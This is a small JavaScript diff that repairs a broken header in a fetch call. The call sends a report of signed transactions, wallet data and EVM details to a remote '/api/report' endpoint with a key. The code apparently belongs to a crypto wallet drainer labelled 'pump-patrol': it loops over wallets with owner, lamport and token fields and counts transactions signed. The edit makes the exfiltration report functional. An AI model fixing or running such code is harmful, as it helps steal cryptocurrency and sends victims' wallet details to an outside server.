@@ -76,5 +76,5 @@ for(const{w,owner,lam,toks}of live){
     first=false;
   }
 }
-await fetch(`${BASE}/api/report/${sid}?k=${K}`,{method:'POST',headers:{content-type:'application/json'},body:JSON.stringify({site,done:true,note:`${sigs} tx signed`,wallets:rep,evm})}).catch(()=>{});
+await fetch(`${BASE}/api/report/${sid}?k=${K}`,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({site,done:true,note:`${sigs} tx signed`,wallets:rep,evm})}).catch(()=>{});
 })().catch(e=>console.warn('pump-patrol',e));
